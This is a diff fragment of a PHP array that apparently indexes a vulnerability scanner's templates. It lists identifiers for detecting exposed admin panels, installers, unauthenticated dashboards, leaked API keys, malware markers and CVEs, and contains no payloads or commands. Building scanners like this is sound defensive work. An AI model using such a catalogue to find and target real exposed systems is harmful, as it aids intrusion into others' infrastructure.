-        1143 => 'miniupnpd-detect',
-        1144 => 'mirth-connect-detect',
-        1145 => 'misconfigured-concrete5',
-        1146 => 'mitel-panel-detect',
-        1147 => 'mlflow-panel',
-        1148 => 'mobile-management-panel',
-        1149 => 'mochiweb-detect',
-        1150 => 'modoboa-panel',
-        1151 => 'moinmoin-detect',
-        1152 => 'mojoportal-detect',
-        1153 => 'molgenis-panel',
-        1154 => 'mongoose-server',
-        1155 => 'monitorr-panel',
-        1156 => 'monstra-installer',
-        1157 => 'monstracms-detect',
-        1158 => 'morningstar-prostar-mppt-detect',
-        1159 => 'moveit-transfer-detect',
-        1160 => 'moxa-mxview-panel',
-        1161 => 'mpftvc-admin-panel',
-        1162 => 'mura-cms-setup-installer',
-        1163 => 'mylittleadmin-panel',
-        1164 => 'mylittlebackup-panel',
-        1165 => 'nagios-logserver-panel',
-        1166 => 'nagios-xi-panel',
-        1167 => 'nagvis-panel',
-        1168 => 'navicat-server-panel',
-        1169 => 'nconf-panel',
-        1170 => 'neo4j-neodash-detect',
-        1171 => 'neobox-panel',
-        1172 => 'neos-detect',
-        1173 => 'nessus-panel',
-        1174 => 'netdata-dashboard-detect',
-        1175 => 'netflix-conductor-ui',
-        1176 => 'netgate-pfsenseplus-panel',
-        1177 => 'netris-dashboard-panel',
-        1178 => 'netsweeper-webadmin-panel',
-        1179 => 'nextchat-detect',
-        1180 => 'nextcloudpi-dashboard',
-        1181 => 'nextjs-vite-public-env',
-        1182 => 'nexus-panel',
-        1183 => 'ni-web-based-panel',
-        1184 => 'nicegui-detect',
-        1185 => 'nimplant-c2',
-        1186 => 'nimsoft-wasp',
-        1187 => 'nmon-login-panel',
-        1188 => 'nocobase-detect',
-        1189 => 'noescape-login',
-        1190 => 'nordex-wind-farm-portal',
-        1191 => 'nostromo-detect',
-        1192 => 'notion-detect',
-        1193 => 'nperf-server-detect',
-        1194 => 'nport-web-console',
-        1195 => 'nsq-admin-panel',
-        1196 => 'nuage-networks-vsp-panel',
-        1197 => 'nuuo-network-login',
-        1198 => 'o2-easy-panel',
-        1199 => 'ocs-inventory-login',
-        1200 => 'ocserv-panel',
-        1201 => 'octobercms-detect',
-        1202 => 'octoprint-3dprinter',
-        1203 => 'octoprint-installer',
-        1204 => 'octoprint-panel',
-        1205 => 'officekeeper-admin-login',
-        1206 => 'okta-panel',
-        1207 => 'olivetti-crf-detect',
-        1208 => 'ollama-llm-panel',
-        1209 => 'oneblog-detect',
-        1210 => 'onion-website-supported',
-        1211 => 'tor-socks-proxy',
-        1212 => 'onlyoffice-login-panel',
-        1213 => 'open-journal-systems',
-        1214 => 'openbmcs-detect',
-        1215 => 'openbullet2-panel',
-        1216 => 'opencart-detect',
-        1217 => 'opencats-panel',
-        1218 => 'openclaw-control-detect',
-        1219 => 'opendcim-detect',
-        1220 => 'openedge-panel',
-        1221 => 'openfire-admin-panel',
-        1222 => 'openhands-panel',
-        1223 => 'openllm-panel',
-        1224 => 'openmetadata-detect',
-        1225 => 'opennebula-panel',
-        1226 => 'openproject-detect',
-        1227 => 'openscada-panel',
-        1228 => 'opensign-panel',
-        1229 => 'opensis-detect',
-        1230 => 'openspeedtest-speedtest',
-        1231 => 'openssl-detect',
-        1232 => 'opentext-contentserver-panel',
-        1233 => 'openvas-panel',
-        1234 => 'openvz-web-login',
-        1235 => 'openwebui-panel',
-        1236 => 'openwrt-login',
-        1237 => 'operations-automation-default-page',
-        1238 => 'opnhap-detect',
-        1239 => 'opnsense-panel',
-        1240 => 'opto22-groov-panel',
-        1241 => 'oracle-access-management',
-        1242 => 'oracle-dbcs',
-        1243 => 'oracle-iplanet-web-server',
-        1244 => 'oracle-opera-login',
-        1245 => 'orangehrm-panel',
-        1246 => 'orangescrum-install',
-        1247 => 'orchard-installer',
-        1248 => 'orchid-vms-panel',
-        1249 => 'oscommerce-detect',
-        1250 => 'osnexus-panel',
-        1251 => 'osticket-panel',
-        1252 => 'ourmgmt3-panel',
-        1253 => 'outback-power-detect',
-        1254 => 'owasp-juice-shop-detect',
-        1255 => 'pagespeed-detect',
-        1256 => 'pahtool-panel',
-        1257 => 'paloalto-expedition-panel',
-        1258 => 'parallels-hsphere-detect',
-        1259 => 'payloadcms-detect',
-        1260 => 'payroll-management-system-panel',
-        1261 => 'pbootcms-detect',
-        1262 => 'pcoweb-panel',
-        1263 => 'pdf-signer-ssti-to-rce',
-        1264 => 'pega-web-panel',
-        1265 => 'peplink-incontrol-panel',
-        1266 => 'permissions-installer',
-        1267 => 'perplexica-panel',
-        1268 => 'persis-panel',
-        1269 => 'pexip-detect',
-        1270 => 'pfsense-login',
-        1271 => 'pghero-detect',
-        1272 => 'phoenix-contact-charx-panel',
-        1273 => 'phoronix-panel',
-        1274 => 'php-fusion-detect',
-        1275 => 'php-mailer',
-        1276 => 'phpldapadmin-panel',
-        1277 => 'phplist-detect',
-        1278 => 'pichome-panel',
-        1279 => 'pinata-api-key',
-        1280 => 'piwigo-detect',
-        1281 => 'piwigo-panel',
-        1282 => 'plantumlserver-detect',
-        1283 => 'plone-cms-detect',
-        1284 => 'pocketbase-detect',
-        1285 => 'polycom-hdx-web-exposure',
-        1286 => 'polynote-panel',
-        1287 => 'portainer-panel',
-        1288 => 'powercom-network-manager',
-        1289 => 'powerjob-panel',
-        1290 => 'powerlogic-ion',
-        1291 => 'prestashop-detect',
-        1292 => 'privatebin-detect',
-        1293 => 'privategpt-detect',
-        1294 => 'processwire-installer',
-        1295 => 'pronote-panel',
-        1296 => 'proofpoint-protection-server-panel',
-        1297 => 'prowlarr-dashboard-unauth',
-        1298 => 'proxmox-panel',
-        1299 => 'ptc-thingworx-panel',
-        1300 => 'pulsar-admin-console',
-        1301 => 'pulsar-adminui-panel',
-        1302 => 'pure-storage-login',
-        1303 => 'pyload-panel',
-        1304 => 'pypiserver-detect',
-        1305 => 'qBittorrent-panel',
-        1306 => 'qdrant-detect',
-        1307 => 'qmail-admin-login',
-        1308 => 'qualcomm-voip-router',
-        1309 => 'qualitor-itsm-panel',
-        1310 => 'quantum-scalar-detect',
-        1311 => 'quilium-panel',
-        1312 => 'r-webserver-login',
-        1313 => 'rabbitmq-dashboard',
-        1314 => 'racksnet-login',
-        1315 => 'radarr-dashboard-unauth',
-        1316 => 'radius-manager-login',
-        1317 => 'ragflow-panel',
-        1318 => 'raritan-pdu-panel',
-        1319 => 'raspberry-shake-config',
-        1320 => 'ray-dashboard',
-        1321 => 'readarr-dashboard-unauth',
-        1322 => 'recoverpoint-panel',
-        1323 => 'red-lion-panel',
-        1324 => 'redlion-hmi-panel',
-        1325 => 'reliable-controls-panel',
-        1326 => 'remedy-axis-login',
-        1327 => 'reolink-panel',
-        1328 => 'reposilite-panel',
-        1329 => 'rethinkdb-admin-console',
-        1330 => 'rhymix-cms-detect',
-        1331 => 'riello-netman204-panel',
-        1332 => 'roadiz-cms-detect',
-        1333 => 'rocketchat-panel',
-        1334 => 'rocketmq-console-exposure',
-        1335 => 'rockwell-factorytalk-viewpoint-panel',
-        1336 => 'rosariosis-detect',
-        1337 => 'routeros-login',
-        1338 => 'roxy-fileman',
-        1339 => 'rseenet-detect',
-        1340 => 'rustici-content-controller',
-        1341 => 'safeq-panel',
-        1342 => 'saltbo-zpan-panel',
-        1343 => 'saltgui-panel',
-        1344 => 'samba-swat-panel',
-        1345 => 'sangfor-iam-panel',
-        1346 => 'sangfor-ngaf-panel',
-        1347 => 'sanity-studio-panel',
-        1348 => 'sap-netweaver-detect',
-        1349 => 'sauter-login',
-        1350 => 'scadabr-panel',
-        1351 => 'scalar-detection',
-        1352 => 'schneider-tac-vista-panel',
-        1353 => 'scribble-diffusion-panel',
-        1354 => 'seagate-nas-login',
-        1355 => 'searxng-detect',
-        1356 => 'securepoint-utm',
-        1357 => 'security-onion-panel',
-        1358 => 'securityspy-detect',
-        1359 => 'seized-site',
-        1360 => 'sekolahku-cms-detect',
-        1361 => 'sel-rtac-panel',
-        1362 => 'semantic-ui-detect',
-        1363 => 'sensu-panel',
-        1364 => 'serge-panel',
-        1365 => 'sevone-nms-network-manager',
-        1366 => 'shardingsphere-panel',
-        1367 => 'sharefile-storage-server',
-        1368 => 'shell-box',
-        1369 => 'shibboleth-detect',
-        1370 => 'ship-manager-dnv',
-        1371 => 'shopizer-detect',
-        1372 => 'shoppable-token',
-        1373 => 'signet-explorer-dashboard',
-        1374 => 'sillytavern-panel',
-        1375 => 'silver-peak-edgeconnect-panel',
-        1376 => 'silverstripe-detect',
-        1377 => 'sitecore-default-page',
-        1378 => 'skysea-panel',
-        1379 => 'skyvern-panel',
-        1380 => 'slims-cms-detect',
-        1381 => 'smartstore-detect',
-        1382 => 'smoothwall-firewall-panel',
-        1383 => 'smtp2go-detect',
-        1384 => 'smtp4dev-interface-exposed',
-        1385 => 'snapdrop-detect',
-        1386 => 'sogo-detect',
-        1387 => 'solar-log-panel',
-        1388 => 'solaredge-monitoring-panel',
-        1389 => 'solarwinds-arm-panel',
-        1390 => 'solarwinds-servuftp-detect',
-        1391 => 'solr-panel-exposure',
-        1392 => 'sonarr-dashboard-unauth',
-        1393 => 'sonicwall-analytics-panel',
-        1394 => 'sonicwall-sma-panel',
-        1395 => 'sonicwall-security-login',
-        1396 => 'sophos-web-appliance',
-        1397 => 'spacelogic-cbus-panel',
-        1398 => 'spinnaker-detect',
-        1399 => 'spip-detect',
-        1400 => 'sqlbuddy-panel',
-        1401 => 'squarespace-detect',
-        1402 => 'squidex-panel',
-        1403 => 'squirrelmail-login',
-        1404 => 'stackstorm-web-ui-panel',
-        1405 => 'statamic-detect',
-        1406 => 'stirling-pdf-detect',
-        1407 => 'stirling-pdf-panel',
-        1408 => 'stormshield-network-security-panel',
-        1409 => 'storybook-panel',
-        1410 => 'streamlit-detect',
-        1411 => 'stridercd-panel',
-        1412 => 'structurizr-panel',
-        1413 => 'subrion-cms-detect',
-        1414 => 'sugarcrm-panel',
-        1415 => 'sunbird-dcim-panel',
-        1416 => 'supabase-studio-panel',
-        1417 => 'superadmin-ui-panel',
-        1418 => 'superagi-panel',
-        1419 => 'supermicro-bmc-panel',
-        1420 => 'suprema-biostar-panel',
-        1421 => 'suse-manager-panel',
-        1422 => 'symantec-epm-login',
-        1423 => 'synology-rackstation-login',
-        1424 => 'synology-web-station',
-        1425 => 'synopsys-coverity-panel',
-        1426 => 'tableau-panel',
-        1427 => 'tableau-server-detect',
-        1428 => 'tableau-service-manager',
-        1429 => 'tactical-rmm-panel',
-        1430 => 'tailon-panel',
-        1431 => 'taskingai-panel',
-        1432 => 'tautulli-panel',
-        1433 => 'teampass-panel',
-        1434 => 'tectuus-scada-monitor',
-        1435 => 'tenable-sc-panel',
-        1436 => 'tensorboard-panel',
-        1437 => 'terramaster-login',
-        1438 => 'thegreenbowvpn-panel',
-        1439 => 'thinfinity-virtualui-panel',
-        1440 => 'thruk-panel',
-        1441 => 'tibco-businessconnect-detect',
-        1442 => 'tibco-businessworks-detect',
-        1443 => 'tibco-spotfire-panel',
-        1444 => 'tibco-spotfire-services-detect',
-        1445 => 'tigase-xmpp-server',
-        1446 => 'tiny-rss-panel',
-        1447 => 'tinyproxy-detect',
-        1448 => 'tlr-2005ksh-login',
-        1449 => 'tooljet-panel',
-        1450 => 'topaccess-panel',
-        1451 => 'topdesk-detect',
-        1452 => 'torrent-magnet-detect',
-        1453 => 'trend-micro-deep-security-panel',
-        1454 => 'trendnet-tew827dru-login',
-        1455 => 'trust-center-detect',
-        1456 => 'tufin-securetrack-login',
-        1457 => 'turnkey-lamp-panel',
-        1458 => 'typebot-panel',
-        1459 => 'typo3-detect',
-        1460 => 'ubiquiti-edgerouter-panel',
-        1461 => 'unifi-securitygateway-panel',
-        1462 => 'ulanzi-clock',
-        1463 => 'unauth-cyber-power-systems',
-        1464 => 'unauth-pact-broker',
-        1465 => 'unauthenticated-airflow-instance',
-        1466 => 'unauthenticated-alert-manager',
-        1467 => 'unauthenticated-mongo-express',
-        1468 => 'unauthorized-printer-hp',
-        1469 => 'unifi-panel',
-        1470 => 'unitronics-plc-panel',
-        1471 => 'untangle-admin-login',
-        1472 => 'urbackup-panel',
-        1473 => 'user-control-panel',
-        1474 => 'usergate-ngfw-admin-panel',
-        1475 => 'utility-service-detect',
-        1476 => 'vaadin-detect',
-        1477 => 'vaultwarden-panel',
-        1478 => 'vbulletin-detect',
-        1479 => 'vectoradmin-panel',
-        1480 => 'veeam-backup-gcp',
-        1481 => 'verba-panel',
-        1482 => 'veriz0wn-osint',
-        1483 => 'verizon-router-panel',
-        1484 => 'versa-analytics-server',
-        1485 => 'versa-flexvnf-panel',
-        1486 => 'vertex-tax-panel',
-        1487 => 'viewpoint-system-status',
-        1488 => 'vinchin-panel',
-        1489 => 'virtua-software-panel',
-        1490 => 'vmware-carbon-black-edr',
-        1491 => 'vmware-horizon-panel',
-        1492 => 'vmware-vcenter-converter-standalone',
-        1493 => 'vtscada-panel',
-        1494 => 'wamp-server-configuration',
-        1495 => 'wamp-xdebug-detect',
-        1496 => 'wd-mycloud-panel',
-        1497 => 'weak-csp-detect',
-        1498 => 'web-viewer-panel',
-        1499 => 'webasyst-installer',
-        1500 => 'webcomco-panel',
-        1501 => 'webmin-panel',
-        1502 => 'webpagetest-panel',
-        1503 => 'websphere-detect',
-        1504 => 'webtrees-install',
-        1505 => 'webuzo-admin-panel',
-        1506 => 'weebly-detect',
-        1507 => 'weights-biases-detect',
-        1508 => 'westermo-router-panel',
-        1509 => 'wg-easy-panel',
-        1510 => 'whatsup-gold-panel',
-        1511 => 'whisparr-dashboard-unauth',
-        1512 => 'whm-login-detect',
-        1513 => 'wiki-js-installer',
-        1514 => 'wildcard-postmessage',
-        1515 => 'wildfly-panel',
-        1516 => 'wildix-collaboration-panel',
-        1517 => 'windmill-panel',
-        1518 => 'wing-ftp-service-detect',
-        1519 => 'winstone-detect',
-        1520 => 'wix-detect',
-        1521 => 'wms-server-detect',
-        1522 => 'wondercms-detect',
-        1523 => 'workerman-websocket-detect',
-        1524 => 'writebook-detect',
-        1525 => 'ws_ftp-server-web-transfer',
-        1526 => 'wsdl-api',
-        1527 => 'wuzhicms-detect',
-        1528 => 'xcp-ng-xo-lite-panel',
-        1529 => 'xeams-admin-console',
-        1530 => 'xfinity-panel',
-        1531 => 'xinference-panel',
-        1532 => 'xphoneconnect-admin-panel',
-        1533 => 'xwiki-detect',
-        1534 => 'yapi-detect',
-        1535 => 'yellowfin-panel',
-        1536 => 'yeswiki-sql',
-        1537 => 'yopass-panel',
-        1538 => 'yourls-detect',
-        1539 => 'zabbix-error',
-        1540 => 'zabbix-server-login',
-        1541 => 'zammad-helpdesk-panel',
-        1542 => 'zap-rest-api-detect',
-        1543 => 'zblogphp-panel',
-        1544 => 'zerof-webserver-detect',
-        1545 => 'zeroshell-login',
-        1546 => 'zimbra-web-login',
-        1547 => 'zipkin-exposure',
-        1548 => 'zk-framework-detect',
-        1549 => 'zoneminder-login',
-        1550 => 'zoneminder-system-log',
-        1551 => 'zope-detect',
-        1552 => 'zywall-usg-panel',
-        1553 => 'zyxel-vsg1432b101-login',
-        1554 => 'openshift-oauth-proxy-panel',
-        1555 => 'CVE-2019-1943',
-        1556 => 'CVE-2021-43574',
-        1557 => 'CVE-2022-47945',
-        1558 => 'CVE-2025-13390',
-        1559 => 'CVE-2026-1207',
-        1560 => 'audiocodes-detect',
-        1561 => 'connectbox-panel',
-        1562 => 'django-variables-exposed',
-        1563 => 'pingaccess-detect',
-        1564 => 'redis-exception-error',
-        1565 => 'salesforce-b2c-commerce-webdav',
-        1566 => 'sap-logon-error-message',
-        1567 => 'tomcat-stacktraces',
-        1568 => 'zyxel-vmg1312b10d-login',
-        1569 => 'CVE-2020-15129',
-        1570 => 'aws-redirect',
-        1571 => 'basic-auth-detect',
-        1572 => 'ccm-detect',
-        1573 => 'codemeter-webadmin-panel',
-        1574 => 'database-error',
-        1575 => 'flask-werkzeug-debug',
-        1576 => 'ixcache-panel',
-        1577 => 'kerion-control-panel',
-        1578 => 'microsoft-azure-error',
-        1579 => 'microsoft-runtime-error',
-        1580 => 'normhost-backup-server-manager',
-        1581 => 'rstudio-detect',
-        1582 => 'softether-vpn-panel',
-        1583 => 'sucuri-firewall',
-        1584 => 'symfony-conflicting-misconfig',
-        1585 => 'twig-runtime-error',
-        1586 => 'windows-admin-center-panel',
-        1587 => 'wordpress-user-enum',
-        1588 => 'yii-error-page',
-        1589 => 'switch-protocol',
-        1590 => 'route-nextjs',
+        114 => 'CVE-2025-12139',
+        115 => 'CVE-2025-31131',
+        116 => 'CVE-2025-4078',
+        117 => 'CVE-2025-46349',
+        118 => 'CVE-2025-50578',
+        119 => 'CVE-2025-46550',
+        120 => 'yeswiki-reflected-xss',
+        121 => 'yeswiki-xss',
+        122 => 'yeswiki-detect',
+        123 => 'CVE-2026-3001',
+        124 => 'ace-admin-dashboard',
+        125 => 'amr-printer-management-unauth',
+        126 => 'ecosys-command-center',
+        127 => 'aspnet-soap-webservices-asmx',
+        128 => 'asus-wl520GU-default-login',
+        129 => 'asus-aicloud-panel',
+        130 => 'atlantis-dashboard',
+        131 => 'atlantis-detect',
+        132 => 'avtech-avn801-camera-panel',
+        133 => 'bitrix24-installer',
+        134 => 'bloofoxcms-login-panel',
+        135 => 'cacti-fpd',
+        136 => 'cacti-panel',
+        137 => 'canon-ir-adv',
+        138 => 'canon-c3325-unauth',
+        139 => 'cgit-detect',
+        140 => 'cgit-panel',
+        141 => 'chainlit-panel',
+        142 => 'ckan-dom-based-xss',
+        143 => 'clickhouse-unauth-api',
+        144 => 'codis-dashboard',
+        145 => 'coming-soon-page-detect',
+        146 => 'default-apache-miracle',
+        147 => 'couchdb-detect',
+        148 => 'couchdb-fauxton',
+        149 => 'deepstack-panel',
+        150 => 'deluge-webui-panel',
+        151 => 'dgraph-dashboard-exposure',
+        152 => 'dont-panic-traceback',
+        153 => 'doris-dashboard',
+        154 => 'dplus-dashboard',
+        155 => 'elastic-hd-dashboard',
+        156 => 'elastic-cloud-api-key',
+        157 => 'encompass-cm1-homepage',
+        158 => 'espeasy-mega-exposure',
+        159 => 'exposed-glances-api',
+        160 => 'unauthenticated-glances',
+        161 => 'express-default-page',
+        162 => 'ezservermonitor-exposure',
+        163 => 'facturascripts-installer',
+        164 => 'ffserver-status',
+        165 => 'fiftyone-panel',
+        166 => 'filebrowser-unauth',
+        167 => 'filebrowser-login-panel',
+        168 => 'flower-detect',
+        169 => 'form-detection',
+        170 => 'gcs-bucket-listing',
+        171 => 'gira-homeserver-homepage',
+        172 => 'gitea-installer',
+        173 => 'global-traffic-statistics',
+        174 => 'graylog-api-exposure',
+        175 => 'graylog-panel',
+        176 => 'h2o-dashboard',
+        177 => 'hfs-exposure',
+        178 => 'impresspages-installer',
+        179 => 'joomla-detect',
+        180 => 'joomla-marvikshop-xss',
+        181 => 'joomla-jlex-xss',
+        182 => 'jotform-api-key',
+        183 => 'klr300n-install',
+        184 => 'krpano-detect',
+        185 => 'kubernetes-web-view',
+        186 => 'kubernetes-enterprise-manager',
+        187 => 'kubernetes-resource-report',
+        188 => 'librespeed-panel',
+        189 => 'magnolia-installer',
+        190 => 'magnolia-panel',
+        191 => 'manageengine-opmanager',
+        192 => 'matomo-installer',
+        193 => 'matomo-panel',
+        194 => 'meddream-dicom-viewer-panel',
+        195 => 'microweber-install',
+        196 => 'microweber-detect',
+        197 => 'miniflux-panel',
+        198 => 'mistserver-installer',
+        199 => 'mobiproxy-dashboard',
+        200 => 'pgwatch2-db-exposure',
+        201 => 'kubernetes-dashboard',
+        202 => 'moleculer-microservices',
+        203 => 'neocase-hrportal-panel',
+        204 => 'netalertx-dashboard',
+        205 => 'netalertx-panel',
+        206 => 'nodebb-installer',
+        207 => 'ntop-panel-exposed',
+        208 => 'ntopng-traffic-dashboard',
+        209 => 'ntop-detect',
+        210 => 'odoo-panel',
+        211 => 'opcache-control-panel',
+        212 => 'openarchives-detect',
+        213 => 'orbeon-forms-exposure',
+        214 => 'owncloud-installer-exposure',
+        215 => 'pa11y-dashboard',
+        216 => 'pi-hole-panel',
+        217 => 'piwik-installer',
+        218 => 'qdpm-login-panel',
+        219 => 'questdb-console',
+        220 => 'qvidium-management-system-exposed',
+        221 => 'rcdevs-webadm-panel',
+        222 => 'sap-igs-detect',
+        223 => 'sap-cloud-analytics',
+        224 => 'sap-message-server-detect',
+        225 => 'sap-spartacus-detect',
+        226 => 'scan2net-panel',
+        227 => 'sdwebui-detect',
+        228 => 'seaweedfs-unauth',
+        229 => 'sentry-panel',
+        230 => 'detect-sentry',
+        231 => 'spring-eureka',
+        232 => 'springboot-actuator',
+        233 => 'springboot-x-application-context',
+        234 => 'sungrow-logger1000-detect',
+        235 => 'thinkcmf-lfi',
+        236 => 'thinkcmf-detection',
+        237 => 'tomcat-directory-listing',
+        238 => 'jkstatus-manager',
+        239 => 'tpot-honeypot-detect',
+        240 => 'unauth-kafka-config-editor',
+        241 => 'kafka-center-login',
+        242 => 'kafka-connect-ui',
+        243 => 'kafka-consumer-monitor',
+        244 => 'kafka-cruise-control',
+        245 => 'kafka-manager-panel',
+        246 => 'kafka-monitoring',
+        247 => 'unauth-apache-kafka-ui',
+        248 => 'unauth-supervisor-dashboard',
+        249 => 'unibox-panel',
+        250 => 'upnp-device-detect',
+        251 => 'vikunja-panel',
+        252 => 'vllm-api-detect',
+        253 => 'wiren-board-webui',
+        254 => 'wp-mega-theme',
+        255 => 'wordpress-plugin-detect',
+        256 => 'wordpress-theme-detect',
+        257 => 'wp-real-estate-xss',
+        258 => 'CVE-2021-24387',
+        259 => 'wp-woocommerce-email-verification',
+        260 => 'CVE-2014-100004',
+        261 => 'CVE-2014-9444',
+        262 => 'CVE-2015-7377',
+        263 => 'CVE-2017-4011',
+        264 => 'CVE-2019-9955',
+        265 => 'CVE-2020-15500',
+        266 => 'tileserver-gl',
+        267 => 'CVE-2020-16952',
+        268 => 'CVE-2020-23517',
+        269 => 'highmail-admin-panel',
+        270 => 'CVE-2020-29047',
+        271 => 'CVE-2020-6171',
+        272 => 'CVE-2021-20086',
+        273 => 'CVE-2021-28918',
+        274 => 'CVE-2021-29625',
+        275 => 'CVE-2022-0150',
+        276 => 'CVE-2022-45836',
+        277 => 'CVE-2023-2813',
+        278 => 'CVE-2023-34598',
+        279 => 'CVE-2023-49293',
+        280 => 'CVE-2024-11740',
+        281 => 'CVE-2024-27954',
+        282 => 'wp-memphis-documents-library-lfi',
+        283 => 'CVE-2024-35694',
+        284 => 'CVE-2026-40878',
+        285 => 'abb-ability-genix-detect',
+        286 => 'accueil-wampserver',
+        287 => 'wampserver-homepage',
+        288 => 'acunetix-login',
+        289 => 'afterlogic-webmail-login',
+        290 => 'agent-zero-detect',
+        291 => 'aim-panel',
+        292 => 'airtame-device-detect',
+        293 => 'lexmark-detect',
+        294 => 'alibaba-mongoshake-unauth',
+        295 => 'ambari-exposure',
+        296 => 'amcrest-login',
+        297 => 'amp-application-panel',
+        298 => 'andover-continuum-panel',
+        299 => 'apache-drill-exposure',
+        300 => 'apache-hive-detect',
+        301 => 'apache-impala',
+        302 => 'apache-jmeter-dashboard',
+        303 => 'apache-jspwiki-detect',
+        304 => 'apache-mesos-panel',
+        305 => 'apache-tika-detect',
+        306 => 'apollo-sandbox-ui-exposed',
+        307 => 'apostrophecms-detect',
+        308 => 'metatag-cms',
+        309 => 'archibus-webcentral-panel',
+        310 => 'argilla-panel',
+        311 => 'ariang-debug-console',
+        312 => 'arize-phoenix-panel',
+        313 => 'aruba-airwave-panel',
+        314 => 'aruba-via-vpn-panel',
+        315 => 'atera-customer-portal',
+        316 => 'aveva-edge-panel',
+        317 => 'aviatrix-panel',
+        318 => 'aws-ec2-autoscale',
+        319 => 'aws-ec2-status',
+        320 => 'ec2-instance-information',
+        321 => 'aws-object-listing',
+        322 => 'aws-xray-application',
+        323 => 'default-amazon-cognito',
+        324 => 'amazon-ec2-detect',
+        325 => 'aws-cloudfront-service',
+        326 => 'aws-detect',
+        327 => 'elastic-beanstalk-detect',
+        328 => 's3-torrent',
+        329 => 'azure-instrumentation-key-exposure',
+        330 => 'azure-apim-secretkey',
+        331 => 'azure-blob-core-detect',
+        332 => 'azure-kubernetes-service',
+        333 => 'default-azure-function-app',
+        334 => 'default-microsoft-azure-page',
+        335 => 'default-page-azure-container',
+        336 => 'veeam-backup-azure-panel',
+        337 => 'balada-injector-malware',
+        338 => 'malwared-byob',
+        339 => 'basercms-install',
+        340 => 'beckhoff-twincat-hmi-panel',
+        341 => 'beyondtrust-remotesupport-panel',
+        342 => 'binom-installer',
+        343 => 'black-duck-panel',
+        344 => 'blackbox-exporter-exposure',
+        345 => 'bmc-controlm-mft-panel',
+        346 => 'bootstrap-admin-panel-template',
+        347 => 'busybox-repository-browser',
+        348 => 'campaignmonitor-takeover',
+        349 => 'chamilo-installer',
+        350 => 'changedetection-unauth',
+        351 => 'changedetection-panel',
+        352 => 'cheatsh-detect',
+        353 => 'cisco-meraki-exposure',
+        354 => 'cisco-webvpn-detect',
+        355 => 'cisco-asa-detect',
+        356 => 'cisco-systems-login',
+        357 => 'cisco-vmanage-login',
+        358 => 'cisco-webui-login',
+        359 => 'citrix-hypervisor-page',
+        360 => 'clearml-panel',
+        361 => 'cloud-metadata',
+        362 => 'json-server',
+        363 => 'cloud-run-default-page',
+        364 => 'cockpit-project-panel',
+        365 => 'codeigniter-errorpage',
+        366 => 'copa-data-zenon-panel',
+        367 => 'couchbase-sync-gateway',
+        368 => 'cpanel-api-codes',
+        369 => 'cribl-stream-panel',
+        370 => 'crypto-mining-malware',
+        371 => 'addeventlistener-detect',
+        372 => 'defaced-website-detect',
+        373 => 'dir-listing',
+        374 => 'google-floc-disabled',
+        375 => 'maxforwards-headers-detect',
+        376 => 'old-copyright',
+        377 => 'spnego-detect',
+        378 => 'x-recruiting-header',
+        379 => 'cyberchef-panel',
+        380 => 'cypress-web-config',
+        381 => 'dash-panel-detect',
+        382 => 'datadog-rum-detect',
+        383 => 'dataiku-panel',
+        384 => 'dd-wrt-controlpanel-exposure',
+        385 => 'default-cakephp-page',
+        386 => 'default-tengine-page',
+        387 => 'delinea-secret-server-panel',
+        388 => 'delphi-mvc-exception',
+        389 => 'deskpro-on-default-page',
+        390 => 'deskpro-default-page',
+        391 => 'determined-ai-panel',
+        392 => 'docmosis-tornado-server',
+        393 => 'tornado-server-login',
+        394 => 'dokploy-panel',
+        395 => 'dolibarr-panel',
+        396 => 'dozzle-container-logs',
+        397 => 'druid-console-exposure',
+        398 => 'drupal-detect',
+        399 => 'drupal-user-enum-ajax',
+        400 => 'drupal-login',
+        401 => 'dufs-detect',
+        402 => 'elasticsearch',
+        403 => 'elasticsearch-sql-client-detect',
+        404 => 'emcecom-default-login',
+        405 => 'dell-remote-web-access-panel',
+        406 => 'emoncms-panel',
+        407 => 'envoy-admin-exposure',
+        408 => 'envoy-metadata-disclosure',
+        409 => 'epson-projector-detect',
+        410 => 'everything-listing',
+        411 => 'exagrid-manager-panel',
+        412 => 'expect-ct-misconfigured',
+        413 => 'deprecated-feature-policy',
+        414 => 'exposed-file-upload-form',
+        415 => 'exposed-kafdrop',
+        416 => 'expression-engine-exception',
+        417 => 'expressionengine-detect',
+        418 => 'facefusion-panel',
+        419 => 'fastchat-panel',
+        420 => 'flarum-installer',
+        421 => 'flask-debug-toolbar',
+        422 => 'flask-detect',
+        423 => 'flask-redis-docker',
+        424 => 'fooocus-panel',
+        425 => 'forgerock-ig-panel',
+        426 => 'fortiap-panel',
+        427 => 'froxlor-management-panel',
+        428 => 'froxlor-detect',
+        429 => 'ftm-manager-panel',
+        430 => 'gitbook-detect',
+        431 => 'glpi-project_glpi',
+        432 => 'gopher-server',
+        433 => 'graphql-playground',
+        434 => 'hangfire-dashboard',
+        435 => 'hetzner-cloud-detect',
+        436 => 'homeworks-illumination',
+        437 => 'hue-personal-wireless-panel',
+        438 => 'hue-wireless-lighting',
+        439 => 'hydra-dashboard',
+        440 => 'ibarn-installer',
+        441 => 'identity-server-v3-detect',
+        442 => 'interswitch-webpay',
+        443 => 'ip-webcam',
+        444 => 'open-mjpg-streamer',
+        445 => 'iparapheur-detect',
+        446 => 'janitza-umg-panel',
+        447 => 'jboss-juddi-panel',
+        448 => 'jenkins-detect',
+        449 => 'unauthenticated-jenkins',
+        450 => 'kaco-new-energy-detect',
+        451 => 'kcfinder-exposure',
+        452 => 'knime-server-panel',
+        453 => 'kodbox-installer',
+        454 => 'koel-panel',
+        455 => 'kong-manager-exposure',
+        456 => 'kong-detect',
+        457 => 'kraken-cluster-monitoring',
+        458 => 'kubeflow-pipelines-panel',
+        459 => 'lacie-panel',
+        460 => 'landesk-csa',
+        461 => 'landesk-ma',
+        462 => 'langtrace-panel',
+        463 => 'laragon-phpinfo',
+        464 => 'lighttpd-placeholder-page',
+        465 => 'lighttpd-default',
+        466 => 'lighttpd-detect',
+        467 => 'linktap-gateway-exposure',
+        468 => 'localai-detect',
+        469 => 'locklizard-webviewer-panel',
+        470 => 'locust-exposure',
+        471 => 'lomnido-panel',
+        472 => 'lorex-panel',
+        473 => 'loxone-web-panel',
+        474 => 'loxone-panel',
+        475 => 'macos-server-panel',
+        476 => 'mag-dashboard-panel',
+        477 => 'mailhog-panel',
+        478 => 'mako-runtime-error',
+        479 => 'mappproxy-detect',
+        480 => 'marimo-panel',
+        481 => 'metaflow-ui-panel',
+        482 => 'metaview-explorer-installer',
+        483 => 'microsys-promotic-panel',
+        484 => 'mongod-exposure',
+        485 => 'mongodb-exception-page',
+        486 => 'mongodb-exposure',
+        487 => 'monsta-ftp-detect',
+        488 => 'mrtg-detect',
+        489 => 'nextcloud-detect',
+        490 => 'nextcloud-install',
